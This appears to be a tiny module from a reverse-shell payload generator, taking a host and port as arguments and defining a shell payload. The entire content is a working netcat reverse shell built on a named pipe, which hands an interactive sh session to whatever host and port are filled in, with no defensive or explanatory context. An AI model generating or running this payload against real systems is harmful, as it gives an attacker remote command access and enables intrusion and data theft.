USAGE = 'host port'
NARGS = [2, 2]
LANG = 'sh'
EXEC = 'PAYLOAD'

pl = '''
rm /tmp/VAR0;mkfifo /tmp/VAR0;sh -i</tmp/VAR0 2>&1|nc ARG1 ARG2>/tmp/VAR0;rm /tmp/VAR0
'''
